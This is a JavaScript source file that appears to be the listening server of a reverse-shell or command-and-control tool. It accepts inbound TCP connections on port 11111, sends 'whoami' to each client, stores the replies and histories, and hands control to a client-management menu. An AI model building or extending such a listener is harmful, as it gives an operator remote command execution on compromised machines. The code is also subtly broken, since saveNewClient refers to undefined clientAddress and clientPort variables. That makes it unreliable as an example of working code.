"use strict";
const net = require("net");
const manageServer = require("../manage_server.js");
const port = 11111;
const socketClients = require("./clients.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                manageServer.getClientCount(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log(`Socket server listening at ${server.address().address}:${port}`);
    console.log("-------------------------------");
});

server.on("connection", (client) => {
    saveNewClient(client);

    // Response is saved by "data" event since it's the first request.
    client.write("whoami");

    manageServer.getClientCount(server);
    manageServer.mainMenu();

    client.on("data", async (data) =>  {
        try {
            const currentClient = await manageServer.getClientConnection(client);
            // Prevent newline being added to shell prompt.
            const clientResponse = data.toString().replace("\n", "");
            currentClient.responseHistory.push(clientResponse);
            currentClient.messageCount++;
            const SECOND_MESSAGE = 1;
            // Save the `whoami` response in the current client's profile.
            if (currentClient.messageCount <= SECOND_MESSAGE) {
               setClientName(currentClient, clientResponse);

                return;
            } else {
                console.log(clientResponse);
            }
        } catch {
            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`);
        }
    });
});

const saveNewClient = (client) => {
    const fullClientAddress = `${clientAddress}:${clientPort}`;
    console.log(`[+] Connection receieved: ${fullClientAddress}`);
    socketClients.push({ address : `${fullClientAddress}`, client, messageCount : 0, name: "", responseHistory : [], uptime: 0 });    
}

const setClientName = (client, name) => {
    client.name = name;
}

module.exports = server;